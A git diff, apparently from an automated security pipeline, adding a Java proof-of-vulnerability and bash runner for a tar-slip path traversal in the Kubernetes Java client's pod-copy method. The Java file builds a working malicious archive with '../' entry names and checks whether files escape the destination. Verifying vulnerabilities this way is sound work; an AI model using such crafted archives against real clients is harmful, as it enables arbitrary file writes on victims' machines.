@@ -1,0 +1,339 @@
+diff --git a/.security-pipeline/pov/CopyTarSlipPov.java b/.security-pipeline/pov/CopyTarSlipPov.java
+new file mode 100644
+index 0000000..408b79b
+--- /dev/null
++++ b/.security-pipeline/pov/CopyTarSlipPov.java
+@@ -0,0 +1,282 @@
++import io.kubernetes.client.Copy;
++import io.kubernetes.client.openapi.ApiClient;
++import io.kubernetes.client.openapi.ApiException;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.io.FileInputStream;
++import java.io.IOException;
++import java.io.InputStream;
++import java.io.OutputStream;
++import java.nio.charset.StandardCharsets;
++import java.util.Base64;
++import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
++import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
++import org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (path traversal / "tar slip") in
++ * io.kubernetes.client.Copy#copyDirectoryFromPod(...).
++ *
++ * Root cause (sink): Copy.java:140
++ *     File f = new File(destination.toFile(), entry.getName());
++ * `entry.getName()` comes straight from a TarArchiveEntry inside the tar
++ * stream produced by `tar cz - <srcPath> | base64` run *inside the target
++ * pod/container* (an untrusted boundary: whatever the remote container
++ * returns is treated as trusted local filesystem paths). No canonicalization
++ * or containment check is performed before `f` (or its parent) is used to
++ * create directories / write file content, so a malicious or compromised
++ * pod can supply entry names like "../evil.txt" to escape the caller's
++ * `destination` directory and write/create arbitrary files/directories
++ * on the machine running the java client.
++ *
++ * This single root cause fans out to two sinks that must both be fixed:
++ *   - Copy.java:140/142 - directory entries: `f.mkdirs()` is called directly
++ *     on the unsanitized path (creates attacker-chosen directories).
++ *   - Copy.java:140/146/147 - file entries: `f.getParentFile()` /
++ *     `parent.mkdirs()` creates attacker-chosen parent directories, followed
++ *     by `new FileOutputStream(f)` at line 150 writing attacker-controlled
++ *     content to an attacker-chosen path outside `destination`.
++ *
++ * This PoV exercises the real Copy.copyDirectoryFromPod(...) method (the
++ * actual tar-parsing / extraction loop at lines 131-155) end to end. Only
++ * the pod exec transport is faked (by subclassing Copy and overriding the
++ * inherited `exec(...)` method, exactly the seam the class already exposes
++ * for testing), because copyDirectoryFromPod's vulnerable logic operates on
++ * whatever bytes come back from `proc.getInputStream()` - it does not care
++ * whether those bytes came from a real websocket or a canned stream. The
++ * crafted payload below is a genuine gzip+tar+base64 stream containing a
++ * TarArchiveEntry named "../pov-tarslip-escaped-file.txt" and another named
++ * "../pov-tarslip-escaped-dir/", parsed by the real TarArchiveInputStream /
++ * GzipCompressorInputStream / Base64InputStream exactly as production code
++ * does.
++ *
++ * Exit code contract:
++ *   0 -> vulnerable behavior reproduced (file/dir escaped destination)
++ *   1 -> escape did not happen (fixed) or the call errored out safely
++ */
++public class CopyTarSlipPov {
++
++  private static final String ESCAPE_FILE_NAME = "../pov-tarslip-escaped-file.txt";
++  private static final String ESCAPE_DIR_NAME = "../pov-tarslip-escaped-dir";
++  private static final String MARKER = "TARSLIP-POV-MARKER";
++
++  public static void main(String[] args) {
++    try {
++      File sandboxRoot = createTempDir("copy-tarslip-pov");
++      File destination = new File(sandboxRoot, "safe-extract-target");
++      if (!destination.mkdirs()) {
++        throw new IOException("could not create destination: " + destination);
++      }
++
++      byte[] maliciousPayload = buildMaliciousTarGzBase64(ESCAPE_FILE_NAME, ESCAPE_DIR_NAME, MARKER);
++
++      ApiClient fakeClient = new ApiClient();
++      FakeCopy copy = new FakeCopy(fakeClient, maliciousPayload);
++
++      File expectedEscapedFile =
++          new File(destination, ESCAPE_FILE_NAME).getCanonicalFile();
++      File expectedEscapedDir =
++          new File(destination, ESCAPE_DIR_NAME).getCanonicalFile();
++      String destinationCanonical = destination.getCanonicalPath();
++
++      // The call that exercises the real, unmodified Copy.copyDirectoryFromPod
++      // extraction loop (Copy.java:119-158) against the malicious tar stream.
++      // Only this.exec(...) is faked (see FakeCopy below); everything else -
++      // base64 decode, gzip decode, tar parsing, `new File(destination, name)`,
++      // mkdirs(), and FileOutputStream writes - is the real production code.
++      boolean threwDuringExtract = false;
++      try {
++        copy.copyDirectoryFromPod("default", "victim-pod", "victim-container", "/some/src", destination.toPath());
++      } catch (Exception e) {
++        threwDuringExtract = true;
++        System.out.println("copyDirectoryFromPod(...) rejected/failed on malicious tar: " + e);
++      }
++
++      boolean escapedFileExists = expectedEscapedFile.isFile();
++      boolean escapedFileOutside =
++          escapedFileExists
++              && !expectedEscapedFile.getCanonicalPath().startsWith(destinationCanonical + File.separator);
++      boolean markerMatches = escapedFileExists && readFile(expectedEscapedFile).contains(MARKER);
++
++      boolean escapedDirExists = expectedEscapedDir.isDirectory();
++      boolean escapedDirOutside =
++          escapedDirExists
++              && !expectedEscapedDir.getCanonicalPath().startsWith(destinationCanonical + File.separator);
++
++      boolean vulnerable =
++          (escapedFileExists && escapedFileOutside && markerMatches) || (escapedDirExists && escapedDirOutside);
++
++      System.out.println("destination                 = " + destinationCanonical);
++      System.out.println("malicious file entry name    = " + ESCAPE_FILE_NAME);
++      System.out.println("malicious dir entry name     = " + ESCAPE_DIR_NAME);
++      System.out.println("resolved escape file path    = " + expectedEscapedFile);
++      System.out.println("resolved escape dir path     = " + expectedEscapedDir);
++      System.out.println("copyDirectoryFromPod threw   = " + threwDuringExtract);
++      System.out.println("escaped file exists          = " + escapedFileExists);
++      System.out.println("escaped file outside dest    = " + escapedFileOutside);
++      System.out.println("escaped file marker matches  = " + markerMatches);
++      System.out.println("escaped dir exists           = " + escapedDirExists);
++      System.out.println("escaped dir outside dest     = " + escapedDirOutside);
++
++      // best-effort cleanup
++      deleteRecursiveQuietly(expectedEscapedFile.getParentFile());
++      deleteRecursiveQuietly(sandboxRoot);
++      deleteRecursiveQuietly(expectedEscapedFile);
++      deleteRecursiveQuietly(expectedEscapedDir);
++
++      if (vulnerable) {
++        System.out.println(
++            "RESULT: VULNERABLE - Copy.copyDirectoryFromPod() wrote a file/dir outside the requested destination directory (tar slip / CWE-22).");
++        System.exit(0);
++      } else {
++        System.out.println(
++            "RESULT: SAFE - Copy.copyDirectoryFromPod() did not write outside the requested destination directory.");
++        System.exit(1);
++      }
++    } catch (Exception e) {
++      e.printStackTrace();
++      System.out.println("RESULT: ERROR - unexpected failure while running the PoV.");
++      System.exit(2);
++    }
++  }
++
++  /**
++   * Subclass of the real Copy class that fakes only the pod-exec transport
++   * (this.exec(...)), which is the seam Copy already relies on for its own
++   * unit tests (see CopyTest.java, which stubs the HTTP/websocket layer).
++   * Everything downstream of exec(...) - the base64 decode, gzip decode,
++   * tar parsing, and file/directory creation - is the real, unmodified
++   * production code path from Copy.java.
++   */
++  private static class FakeCopy extends Copy {
++    private final byte[] maliciousBase64GzipTarPayload;
++
++    FakeCopy(ApiClient apiClient, byte[] maliciousBase64GzipTarPayload) {
++      super(apiClient);
++      this.maliciousBase64GzipTarPayload = maliciousBase64GzipTarPayload;
++    }
++
++    @Override
++    public Process exec(
++        String namespace, String name, String[] command, String container, boolean stdin, boolean tty)
++        throws ApiException, IOException {
++      String joined = String.join(" ", command);
++      if (joined.contains("tar --version")) {
++        // Pretend the container has tar installed.
++        return new StubProcess(new ByteArrayInputStream(new byte[0]), 0);
++      }
++      if (joined.contains("tar cz")) {
++        // Return the attacker-controlled tar stream that the "pod" would
++        // have produced, base64-encoded exactly like the real `| base64`
++        // pipeline in copyDirectoryFromPod's exec command.
++        return new StubProcess(new ByteArrayInputStream(maliciousBase64GzipTarPayload), 0);
++      }
++      throw new IOException("unexpected command in PoV stub: " + joined);
++    }
++  }
++
++  /** Minimal java.lang.Process stand-in used only to feed canned bytes to Copy's extraction loop. */
++  private static class StubProcess extends Process {
++    private final InputStream inputStream;
++    private final int exitCode;
++
++    StubProcess(InputStream inputStream, int exitCode) {
++      this.inputStream = inputStream;
++      this.exitCode = exitCode;
++    }
++
++    @Override
++    public OutputStream getOutputStream() {
++      return new ByteArrayOutputStream();
++    }
++
++    @Override
++    public InputStream getInputStream() {
++      return inputStream;
++    }
++
++    @Override
++    public InputStream getErrorStream() {
++      return new ByteArrayInputStream(new byte[0]);
++    }
++
++    @Override
++    public int waitFor() {
++      return exitCode;
++    }
++
++    @Override
++    public int exitValue() {
++      return exitCode;
++    }
++
++    @Override
++    public void destroy() {}
++  }
++
++  /**
++   * Builds a real gzip(tar(entries))-then-base64 byte stream containing a
++   * malicious file entry (with content, so we can verify it was actually
++   * written) and a malicious directory entry - matching exactly what
++   * `tar cz - <path> | base64` running inside a pod would produce, except
++   * the entry names contain ".." path traversal segments.
++   */
++  private static byte[] buildMaliciousTarGzBase64(String fileEntryName, String dirEntryName, String content)
++      throws IOException {
++    ByteArrayOutputStream rawOut = new ByteArrayOutputStream();
++    try (GzipCompressorOutputStream gzOut = new GzipCompressorOutputStream(rawOut);
++        TarArchiveOutputStream tarOut = new TarArchiveOutputStream(gzOut)) {
++      tarOut.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
++
++      byte[] fileBytes = content.getBytes(StandardCharsets.UTF_8);
++      TarArchiveEntry fileEntry = new TarArchiveEntry(fileEntryName);
++      fileEntry.setSize(fileBytes.length);
++      tarOut.putArchiveEntry(fileEntry);
++      tarOut.write(fileBytes);
++      tarOut.closeArchiveEntry();
++
++      TarArchiveEntry dirEntry = new TarArchiveEntry(dirEntryName + "/");
++      tarOut.putArchiveEntry(dirEntry);
++      tarOut.closeArchiveEntry();
++    }
++    return Base64.getEncoder().encode(rawOut.toByteArray());
++  }
++
++  private static String readFile(File f) throws IOException {
++    try (InputStream in = new FileInputStream(f)) {
++      ByteArrayOutputStream out = new ByteArrayOutputStream();
++      byte[] buf = new byte[4096];
++      int n;
++      while ((n = in.read(buf)) != -1) {
++        out.write(buf, 0, n);
++      }
++      return new String(out.toByteArray(), StandardCharsets.UTF_8);
++    }
++  }
++
++  private static File createTempDir(String prefix) throws IOException {
++    File base = File.createTempFile(prefix, "");
++    if (!base.delete()) {
++      throw new IOException("could not delete temp file placeholder: " + base);
++    }
++    if (!base.mkdirs()) {
++      throw new IOException("could not create temp dir: " + base);
++    }
++    return base;
++  }
++
++  private static void deleteRecursiveQuietly(File f) {
++    if (f == null || !f.exists()) {
++      return;
++    }
++    File[] children = f.listFiles();
++    if (children != null) {
++      for (File c : children) {
++        deleteRecursiveQuietly(c);
++      }
++    }
++    f.delete();
++  }
++}
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..15c1adb
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/io/kubernetes/client-java-api/9.0.1/client-java-api-9.0.1.jar:/root/.m2/repository/io/sundr/builder-annotations/0.21.0/builder-annotations-0.21.0.jar:/root/.m2/repository/io/sundr/sundr-core/0.21.0/sundr-core-0.21.0.jar:/root/.m2/repository/io/sundr/sundr-codegen/0.21.0/sundr-codegen-0.21.0.jar:/root/.m2/repository/io/sundr/resourcecify-annotations/0.21.0/resourcecify-annotations-0.21.0.jar:/root/.m2/repository/javax/annotation/javax.annotation-api/1.3.2/javax.annotation-api-1.3.2.jar:/root/.m2/repository/io/swagger/swagger-annotations/1.6.2/swagger-annotations-1.6.2.jar:/root/.m2/repository/com/squareup/okhttp3/okhttp/3.14.3/okhttp-3.14.3.jar:/root/.m2/repository/com/squareup/okio/okio/1.17.2/okio-1.17.2.jar:/root/.m2/repository/com/squareup/okhttp3/logging-interceptor/3.14.3/logging-interceptor-3.14.3.jar:/root/.m2/repository/com/google/code/gson/gson/2.8.6/gson-2.8.6.jar:/root/.m2/repository/io/gsonfire/gson-fire/1.8.4/gson-fire-1.8.4.jar:/root/.m2/repository/joda-time/joda-time/2.10.6/joda-time-2.10.6.jar:/root/.m2/repository/org/joda/joda-convert/2.2.1/joda-convert-2.2.1.jar:/root/.m2/repository/com/google/code/findbugs/jsr305/3.0.2/jsr305-3.0.2.jar:/root/.m2/repository/io/kubernetes/client-java-proto/9.0.1/client-java-proto-9.0.1.jar:/root/.m2/repository/org/yaml/snakeyaml/1.26/snakeyaml-1.26.jar:/root/.m2/repository/commons-codec/commons-codec/1.14/commons-codec-1.14.jar:/root/.m2/repository/org/apache/commons/commons-compress/1.20/commons-compress-1.20.jar:/root/.m2/repository/org/apache/commons/commons-lang3/3.11/commons-lang3-3.11.jar:/root/.m2/repository/com/google/guava/guava/29.0-jre/guava-29.0-jre.jar:/root/.m2/repository/com/google/guava/failureaccess/1.0.1/failureaccess-1.0.1.jar:/root/.m2/repository/com/google/guava/listenablefuture/9999.0-empty-to-avoid-conflict-with-guava/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar:/root/.m2/repository/org/checkerframework/checker-qual/2.11.1/checker-qual-2.11.1.jar:/root/.m2/repository/com/google/errorprone/error_prone_annotations/2.3.4/error_prone_annotations-2.3.4.jar:/root/.m2/repository/com/google/j2objc/j2objc-annotations/1.3/j2objc-annotations-1.3.jar:/root/.m2/repository/org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar:/root/.m2/repository/org/bouncycastle/bcprov-ext-jdk15on/1.66/bcprov-ext-jdk15on-1.66.jar:/root/.m2/repository/org/bouncycastle/bcpkix-jdk15on/1.66/bcpkix-jdk15on-1.66.jar:/root/.m2/repository/org/bouncycastle/bcprov-jdk15on/1.66/bcprov-jdk15on-1.66.jar:/root/.m2/repository/com/microsoft/azure/adal4j/1.6.5/adal4j-1.6.5.jar:/root/.m2/repository/com/nimbusds/oauth2-oidc-sdk/6.5/oauth2-oidc-sdk-6.5.jar:/root/.m2/repository/com/sun/mail/javax.mail/1.6.1/javax.mail-1.6.1.jar:/root/.m2/repository/javax/activation/activation/1.1/activation-1.1.jar:/root/.m2/repository/com/github/stephenc/jcip/jcip-annotations/1.0-1/jcip-annotations-1.0-1.jar:/root/.m2/repository/net/minidev/json-smart/2.3/json-smart-2.3.jar:/root/.m2/repository/net/minidev/accessors-smart/1.2/accessors-smart-1.2.jar:/root/.m2/repository/com/nimbusds/lang-tag/1.7/lang-tag-1.7.jar:/root/.m2/repository/com/nimbusds/nimbus-jose-jwt/10.9.1/nimbus-jose-jwt-10.9.1.jar:/root/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar:/root/.m2/repository/ch/qos/logback/logback-core/1.2.3/logback-core-1.2.3.jar:/root/.m2/repository/com/google/protobuf/protobuf-java/3.12.2/protobuf-java-3.12.2.jar:/root/.m2/repository/org/apache/commons/commons-collections4/4.4/commons-collections4-4.4.jar:/root/.m2/repository/org/bitbucket/b_c/jose4j/0.7.2/jose4j-0.7.2.jar:/root/.m2/repository/junit/junit/4.13/junit-4.13.jar:/root/.m2/repository/org/hamcrest/hamcrest-core/1.3/hamcrest-core-1.3.jar:/root/.m2/repository/org/mockito/mockito-core/3.4.4/mockito-core-3.4.4.jar:/root/.m2/repository/net/bytebuddy/byte-buddy/1.10.13/byte-buddy-1.10.13.jar:/root/.m2/repository/net/bytebuddy/byte-buddy-agent/1.10.13/byte-buddy-agent-1.10.13.jar:/root/.m2/repository/org/objenesis/objenesis/2.6/objenesis-2.6.jar:/root/.m2/repository/com/github/stefanbirkner/system-rules/1.19.0/system-rules-1.19.0.jar:/root/.m2/repository/com/github/tomakehurst/wiremock/2.27.1/wiremock-2.27.1.jar:/root/.m2/repository/org/eclipse/jetty/jetty-server/9.2.28.v20190418/jetty-server-9.2.28.v20190418.jar:/root/.m2/repository/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:/root/.m2/repository/org/eclipse/jetty/jetty-http/9.2.28.v20190418/jetty-http-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-io/9.2.28.v20190418/jetty-io-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-servlet/9.2.28.v20190418/jetty-servlet-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-security/9.2.28.v20190418/jetty-security-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-servlets/9.2.28.v20190418/jetty-servlets-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-continuation/9.2.28.v20190418/jetty-continuation-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-util/9.2.28.v20190418/jetty-util-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-webapp/9.2.28.v20190418/jetty-webapp-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-xml/9.2.28.v20190418/jetty-xml-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-proxy/9.2.28.v20190418/jetty-proxy-9.2.28.v20190418.jar:/root/.m2/repository/org/eclipse/jetty/jetty-client/9.2.28.v20190418/jetty-client-9.2.28.v20190418.jar:/root/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.11.0/jackson-core-2.11.0.jar:/root/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.11.0/jackson-annotations-2.11.0.jar:/root/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.11.0/jackson-databind-2.11.0.jar:/root/.m2/repository/org/apache/httpcomponents/httpclient/4.5.12/httpclient-4.5.12.jar:/root/.m2/repository/org/apache/httpcomponents/httpcore/4.4.13/httpcore-4.4.13.jar:/root/.m2/repository/commons-logging/commons-logging/1.2/commons-logging-1.2.jar:/root/.m2/repository/org/xmlunit/xmlunit-core/2.7.0/xmlunit-core-2.7.0.jar:/root/.m2/repository/org/xmlunit/xmlunit-legacy/2.7.0/xmlunit-legacy-2.7.0.jar:/root/.m2/repository/org/xmlunit/xmlunit-placeholders/2.7.0/xmlunit-placeholders-2.7.0.jar:/root/.m2/repository/com/jayway/jsonpath/json-path/2.4.0/json-path-2.4.0.jar:/root/.m2/repository/org/ow2/asm/asm/7.0/asm-7.0.jar:/root/.m2/repository/net/sf/jopt-simple/jopt-simple/5.0.3/jopt-simple-5.0.3.jar:/root/.m2/repository/com/github/jknack/handlebars/4.0.7/handlebars-4.0.7.jar:/root/.m2/repository/org/antlr/antlr4-runtime/4.7.1/antlr4-runtime-4.7.1.jar:/root/.m2/repository/com/github/jknack/handlebars-helpers/4.0.7/handlebars-helpers-4.0.7.jar:/root/.m2/repository/com/flipkart/zjsonpatch/zjsonpatch/0.4.4/zjsonpatch-0.4.4.jar:/root/.m2/repository/commons-fileupload/commons-fileupload/1.4/commons-fileupload-1.4.jar:/root/.m2/repository/commons-io/commons-io/2.2/commons-io-2.2.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..acec693
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,37 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 tar-slip path traversal in
++# io.kubernetes.client.Copy#copyDirectoryFromPod (Copy.java:140).
++#
++# Builds the `util` module (and its `client-java-api` / `client-java-proto`
++# dependencies) with Maven, resolves the module's runtime classpath,
++# compiles the standalone PoV against it, and runs it. Exits 0 iff a
++# malicious tar entry name ("../pov-tarslip-escaped-file.txt") is extracted
++# outside the caller-supplied destination directory by
++# Copy.copyDirectoryFromPod(...).
++#
++# Must be run from the repository root (/workspace/repo in the container).
++set -euo pipefail
++
++REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
++cd "$REPO_ROOT"
++
++POV_DIR="$REPO_ROOT/.security-pipeline/pov"
++OUT_DIR="$POV_DIR/out"
++rm -rf "$OUT_DIR"
++mkdir -p "$OUT_DIR"
++
++# 1. Install `util` and its module dependencies (client-java-api,
++#    client-java-proto) into the local repo so the classpath resolves.
++mvn -q -B -pl util -am -DskipTests install
++
++# 2. Resolve util's runtime classpath.
++CP_FILE="$POV_DIR/cp.txt"
++mvn -q -B -pl util dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >/dev/null
++
++CP="$REPO_ROOT/util/target/classes:$(cat "$CP_FILE")"
++
++# 3. Compile the PoV.
++javac -cp "$CP" -d "$OUT_DIR" "$POV_DIR/CopyTarSlipPov.java"
++
++# 4. Run the PoV. Exit code 0 == vulnerable behavior reproduced.
++java -cp "$CP:$OUT_DIR" CopyTarSlipPov
